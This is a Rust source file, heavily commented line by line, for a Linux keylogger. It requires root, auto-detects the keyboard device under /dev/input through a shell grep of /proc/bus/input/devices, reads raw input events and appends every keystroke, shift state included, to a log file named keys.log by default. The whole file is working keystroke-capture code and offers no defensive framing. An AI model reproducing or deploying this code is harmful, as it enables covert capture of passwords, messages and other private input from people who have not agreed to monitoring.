# Imports
extern crate getopts; // Import the getopts crate for command-line argument parsing
extern crate env_logger; // Import the env_logger crate for logging
extern crate libc; // Import the libc crate for low-level C library bindings

# [macro_use]
extern crate log; // Import the log crate for logging macros

mod input; // Import the 'input' module from a separate file

use input::{is_key_event, is_key_press, is_key_release, is_shift, get_key_text, InputEvent}; // Import functions and types from the 'input' module
use std::process::{exit, Command}; // Import process-related functions
use std::fs::{File, OpenOptions}; // Import file system-related functions and types
use std::io::{Read, Write}; // Import input/output functions
use std::{env, mem}; // Import miscellaneous functions and memory manipulation

use getopts::Options; // Import the 'Options' type from the 'getopts' crate

const VERSION: &'static str = env!("CARGO_PKG_VERSION"); // Define a constant for the version of the program

// Define a configuration struct to hold device and log file paths
# [derive(Debug)]
struct Config {
    device_file: String,
    log_file: String,
}

impl Config {
    fn new(device_file: String, log_file: String) -> Self {
        Config { device_file, log_file }
    }
}

fn main() {
    root_check(); // Check if the program is running as root

    env_logger::init().unwrap(); // Initialize the logger

    let config = parse_args(); // Parse command line arguments to get the configuration
    debug!("Config: {:?}", config); // Log the configuration

    // Open the log file for writing, creating it if it doesn't exist and appending to it
    let mut log_file = OpenOptions::new()
        .create(true)
        .write(true)
        .append(true)
        .open(&config.log_file)
        .unwrap_or_else(|e| panic!("{}", e));

    // Open the device file for reading
    let mut device_file = File::open(&config.device_file).unwrap_or_else(|e| panic!("{}", e));

    // Define a buffer for reading input events
    let mut buf: [u8; mem::size_of::<InputEvent>()] = unsafe { mem::zeroed() };

    // Keep track of the shift key state
    let mut shift_pressed = 0;

    // Main loop to read and process input events
    loop {
        let num_bytes = device_file.read(&mut buf).unwrap_or_else(|e| panic!("{}", e)); // Read from the device file

        // Ensure that we read the correct number of bytes for an InputEvent
        if num_bytes != mem::size_of::<InputEvent>() {
            panic!("Error while reading from device file");
        }

        // Convert the buffer to an InputEvent
        let event: InputEvent = unsafe { mem::transmute(buf) };

        // Check if it's a key event
        if is_key_event(event.type_) {
            if is_key_press(event.value) {
                if is_shift(event.code) {
                    shift_pressed += 1;
                }

                // Get the text representation of the key and write it to the log file
                let text = get_key_text(event.code, shift_pressed).as_bytes();
                let num_bytes = log_file.write(text).unwrap_or_else(|e| panic!("{}", e));

                // Ensure that all bytes were written
                if num_bytes != text.len() {
                    panic!("Error while writing to log file");
                }
            } else if is_key_release(event.value) {
                if is_shift(event.code) {
                    shift_pressed -= 1;
                }
            }
        }
    }
}

// Check if the program is running as root
fn root_check() {
    let euid = unsafe { libc::geteuid() }; // Get the effective user ID
    if euid != 0 {
        panic!("Must run as root user");
    }
}

// Parse command line arguments and return a Config struct
fn parse_args() -> Config {
    fn print_usage(program: &str, opts: Options) {
        let brief = format!("Usage: {} [options]", program);
        println!("{}", opts.usage(&brief));
    }

    // Parse command line arguments
    let args: Vec<_> = env::args().collect();

    let mut opts = Options::new();
    opts.optflag("h", "help", "prints this help message"); // Define a help flag
    opts.optflag("v", "version", "prints the version"); // Define a version flag
    opts.optopt("d", "device", "specify the device file", "DEVICE"); // Define an option for specifying the device file
    opts.optopt("f", "file", "specify the file to log to", "FILE"); // Define an option for specifying the log file

    let matches = opts.parse(&args[1..]).unwrap_or_else(|e| panic!("{}", e)); // Parse the arguments

    // Check for help and version flags
    if matches.opt_present("h") {
        print_usage(&args[0], opts);
        exit(0);
    }

    if matches.opt_present("v") {
        println!("{}", VERSION);
        exit(0);
    }

    // Get the device and log file paths from the arguments or use defaults
    let device_file = matches.opt_str("d").unwrap_or_else(get_default_device);
    let log_file = matches.opt_str("f").unwrap_or("keys.log".to_owned());

    Config::new(device_file, log_file)
}

// Get the default device by detecting available keyboard devices
fn get_default_device() -> String {
    let mut filenames = get_keyboard_device_filenames();
    debug!("Detected devices: {:?}", filenames);

    if filenames.len() == 1 {
        filenames.swap_remove(0)
    } else {
        panic!("The following keyboard devices were detected: {:?}. Please select one using \
                the `-d` flag", filenames);
    }
}

// Detect and return the names of keyboard device files
fn get_keyboard_device_filenames() -> Vec<String> {
    let mut command_str = "grep -E 'Handlers|EV' /proc/bus/input/devices".to_string();
    command_str.push_str("| grep -B1 120013");
    command_str.push_str("| grep -Eo event[0-9]+");

    let res = Command::new("sh")
        .arg("-c")
        .arg(command_str)
        .output()
        .unwrap_or_else(|e| {
            panic!("{}", e);
        });

    let res_str = std::str::from_utf8(&res.stdout).unwrap();

    let mut filenames = Vec::new();
    for file in res_str.trim().split('\n') {
        let mut filename = "/dev/input/".to_string();
        filename.push_str(file);
        filenames.push(filename);
    }
    filenames
}